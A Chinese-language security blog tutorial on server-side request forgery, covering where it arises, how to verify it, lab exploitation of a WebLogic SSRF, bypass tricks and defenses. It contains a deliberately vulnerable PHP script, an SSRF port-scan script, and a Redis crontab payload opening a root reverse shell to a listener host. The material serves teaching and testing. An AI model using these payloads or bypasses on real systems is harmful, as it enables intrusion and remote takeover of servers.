---
title: 【漏洞笔记】浅谈SSRF原理及其利用
date: 2019-12-22 19:22:27
id: 191222-192227
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF1.png
tags:
- SSRF
- 漏洞笔记
- 学习笔记
categories:
- 学习笔记
---
声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。

# 0x00 漏洞说明
SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。
<!--more-->
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF1.png)

# 0x01 漏洞影响
上面简单介绍了一下SSRF的原理，那么SSRF能干什么，产生哪些危害呢？

利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等，可以说SSRF的危害不容小觑了。

# 0x02 漏洞发现
既然SSRF有这些危害，那我们要怎么发现哪里存在SSRF，发现了又怎么利用呢？接下来就好好唠唠这点。

可以这么说，能够对外发起网络请求的地方，就可能存在SSRF漏洞，下面的内容引用了先知社区的一篇文章，文章链接在底部。

具体可能出现SSRF的地方：

1.社交分享功能：获取超链接的标题等内容进行显示

2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

3.在线翻译：给网址翻译对应网页的内容

4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片

5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验

6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试

7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

8.数据库内置功能：数据库的比如mongodb的copyDatabase函数

9.邮件系统：比如接收邮件服务器地址

10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……

12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）

# 0x03 漏洞验证
1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞

2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞
```
http://www.xxx.com/a.php?image=(地址)
```

# 0x04 漏洞利用
## 1、一个简单的测试靶场
测试PHP代码：

```php
<?php
function curl($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_exec($ch);
	curl_close($ch);
}

$url = $_GET['url'];
curl($url);
?>
```
利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。
```
http://192.168.38.132/ssrf.php?url=teamssix.com
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF2.png)

如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口

打开Burp，抓包发到Intruder，设置Payload位置

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF3.png)

将载荷类型设置为number，数字范围从1-65535，开始爆破

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF4.png)

根据响应长度及响应码，可以判断出80、3389是开放着的

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF5.png)

## 2、Weblogic漏洞复现
搭建环境参考：https://blog.csdn.net/qq_36374896/article/details/84102101

搭建好之后，访问 IP:7001/uddiexplorer/ 即可访问，如果搭建在本机， IP 就是127.0.0.1。

### 1、漏洞存在测试
Weblogic 的 SSRF 漏洞地址在 /uddiexplorer/SearchPublicRegistries.jsp ，开启Burp代理后，来到漏洞地址，随便在搜索框里输点东西，点击 search 按钮抓包

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF6.png)

可以看到在请求包里的 operator 参数值为URL，说明此处可能存在SSRF漏洞

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF7.png)

将 operator 参数值为改为其他URL，再次进行发包测试

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF8.png)

把响应包翻到底部，可以很明显的看到靶机对我们修改后的URL进行了访问，接下来把URL端口修改一下，也就是让靶机请求一个不存在的地址

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF9.png)

这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。

### 2、通过Redis服务反弹shell
既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。

进入 redis服务 的shell，查看内网IP

```
:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash
[root@5d9f91f455b6 /]# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  
          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:129 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)
```
知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的

```python
import requests
url = 'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'
headers = {'Content-Type':'application/x-www-form-urlencoded'}
for port in range(1,65535):
	data = 'operator=http://172.18.0.2:{}&rdoSearch=name&txtSearchname=teamsix&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'.format(port)
	r = requests.post(url,headers=headers,data=data)
	if 'Tried all' not in r.text:
		print('\n\n[+] {} 发现端口\n\n'.format(port))
```
执行脚本

```
~# python3 ssrf_portscan.py
[+] 6379 发现端口
```
通过扫描发现Redis服务的默认端口6373是开放的。

接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址

```
http://172.18.0.2:6379/test

set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.10.30/4444 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save

aaa
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF10.png)

如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。

如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SSRF11.png)

# 0x05 绕过技巧
1、添加端口号：http://127.0.0.1:8080

2、短网址绕过：http://dwz.cn/11SMa

3、IP限制绕过：十进制转换、八进制转换、十六进制转换、不同进制组合转换

4、协议限制绕过：当url协议限制只为http(s)时,可以利用follow redirect特性,构造302跳转服务,结合dict://,file://,gopher://

5、可以指向任意ip的域名：xip.io

6、@    http://abc@127.0.0.1

# 0x06 SSRF防御
1、过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2、统一错误信息,避免用户可以根据错误信息来判断远程服务器的端口状态。

3、限制请求的端口为http常用的端口,比如80,443,8080,8090

4、黑名单内网ip。避免应用被用来获取内网数据,攻击内网

5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题


>更多信息欢迎关注我的微信公众号：TeamsSix

>参考文章
>https://xz.aliyun.com/t/2115
>http://www.liuwx.cn/penetrationtest-3.html
>https://www.cnblogs.com/yuzly/p/10903398.html
>https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
>https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/
